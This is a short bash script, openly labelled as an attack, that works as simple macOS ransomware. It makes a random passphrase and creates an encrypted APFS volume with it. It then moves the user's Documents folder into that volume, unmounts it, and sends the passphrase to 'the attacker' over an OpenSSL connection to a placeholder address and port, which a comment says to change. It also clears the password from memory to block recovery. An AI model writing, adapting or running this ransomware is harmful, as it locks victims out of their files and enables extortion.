#! /usr/bin/env bash

# Creating random and unique password
p=$(head -n 1024 /dev/urandom | strings| grep -o "[[:alnum:]]" | head -n 64| tr -d "\n");

# Identify Disk (Apple File System Volume)
disk_name=$(diskutil info / | grep "APFS Container:" | tr -s " "| cut -d" " -f4);

# Creating APFS Volume (aka drive) and encrypting it with password
diskutil apfs addVolume "${disk_name}" APFS XX -passphrase "${p}";

# Moving important files to the drive
mv -f ~/Documents/* /Volumes/XX;

# Unmounting drive
diskutil umount XX;

# echo'ing the password to the attacker using OpenSSL
echo $p | timeout 2 openssl s_client -quiet -connect 127.0.0.1:9001 2>/dev/null;

# Added this to ensure that the creentials cannot be recovered via memory dump
p="";

# change the IP address and Port number
# Use chmod +x name.sh to make the script executable
# name: <name>.sh